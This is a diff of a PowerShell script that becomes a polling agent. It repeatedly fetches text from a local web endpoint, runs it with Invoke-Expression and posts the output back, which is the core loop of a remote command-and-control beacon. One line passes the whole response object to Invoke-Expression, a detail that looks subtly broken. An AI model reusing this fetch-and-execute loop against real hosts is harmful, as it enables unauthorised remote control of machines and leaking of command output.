@@ -1,18 +1,24 @@
 $ProgressPreference = 'SilentlyContinue'
-#while ($true)
-#{
-    $cmd = ConvertFrom-Json (Invoke-WebRequest 'http://localhost:5000/test')
-    if (!$cmd.code) 
-    { 
-        if ($cmd.cmd -eq "exit-agent") { break }
-        $result = Invoke-Expression ($cmd.cmd)
-        write-host $result
-        if( -not $? ) { $result = $Error[0].Exception.Message }
-        $post = @{"id"=$cmd.id;"result"=$result;}
-        #write-host (ConvertTo-Json $result)
-        #Invoke-WebRequest -Uri http://localhost:5000/test -Method POST -Body (ConvertTo-Json $post) -ContentType 'application/json; charset=utf-8'
-        #Invoke-RestMethod -Uri http://localhost:5000/test -Method POST -Body (ConvertTo-Json $post) -ContentType 'application/json; charset=utf-8'
+$sleep = 2
+$post = ''
+while ($true)
+{
+    Start-Sleep -Seconds $sleep
+    $cmd = Invoke-WebRequest 'http://localhost:5000/test'
+    if ($cmd.Content -eq 'exit-agent') { break }
+    if ($cmd.Content -eq '') { continue }
+
+    $result = Invoke-Expression $cmd
+    
+    if ($result -is [string]) { $post = $result }
+    elseif ($result -is [array])
+    {
+        foreach ($line in $result)
+        {
+            $post += $line.ToString() + "%NL%"
+        }
     }
-    else
-    { }
-#}
+
+    Invoke-RestMethod -Uri http://localhost:5000/test -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
+    $post = ''
+}
